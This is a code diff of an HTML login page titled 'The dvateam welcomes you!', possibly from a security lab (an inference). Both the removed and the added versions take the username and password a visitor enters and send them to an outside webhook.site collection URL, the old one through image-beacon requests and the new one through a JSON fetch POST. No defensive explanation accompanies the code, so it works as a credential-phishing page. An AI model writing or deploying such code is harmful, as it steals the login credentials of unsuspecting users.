@@ -30,39 +30,53 @@
 </head>
 <body>
   <h1>The dvateam welcomes you!</h1>
-  <form>
-    <label for="domTextElement">Username:</label>
-    <input type="text" id="username" name="username">
-    <br>
-    <br>
-    <label for="domTextElement1">Password: </label>
-    <input type="password" id="password" name="password">
-    <br>
-    <br>       
-    <button type="button" onclick="getValueInput()">click me!!</button>
-    <p id="valueInput"></p>
-  </form>
-  <script>
-    const getValueInput = () =>{
-    let inputValue = document.getElementById("username").value;
-    let inputValue1 = document.getElementById("password").value;
-    var i=new Image();
-    var j=new Image();
-    i.src="https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36/?password="+inputValue1;
-    j.src="https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36/?username="+inputValue; 
-    window.location.reload();
-  }
-  </script>
-    <button id="openWebPageButton">webhook</button>
+    <form id="myForm">
+      <input type="text" id="username" placeholder="Username">
+      <input type="password" id="password" placeholder="Password">
+      <button type="submit">Submit</button>
+    </form>
 
     <script>
-        // Add an event listener to the button to open a web page
-        document.getElementById("openWebPageButton").addEventListener("click", function () {
-            // Replace the URL below with the web page you want to open
-            const webpageUrl = "https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36"; // Replace with your desired URL
-            window.open(webpageUrl, "_blank"); // Opens the URL in a new tab or window
-        });
-    </script>
+    document.getElementById("myForm").addEventListener("submit", function(event) {
+  event.preventDefault(); // Prevent the form from submitting by default
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+  sendUserDataToWebhook(username, password);
+});
+
+function sendUserDataToWebhook(username, password) {
+  // Replace with your webhook.site URL
+  const webhookUrl = "https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36";
+
+  // Create a JSON payload with both username and password
+  const payload = {
+    username: username,
+    password: password
+  };
+
+  // Send the data to webhook.site
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(payload)
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error(`HTTP Error! Status: ${response.status}`);
+    }
+    return response.json();
+  })
+  .then(data => {
+    // Handle the webhook.site response (if needed)
+    console.log("webhook.site response:", data);
+  })
+  .catch(error => {
+    console.error("Error sending data to webhook.site:", error);
+  });
+}
+</script>
   
 </body>
 </html>
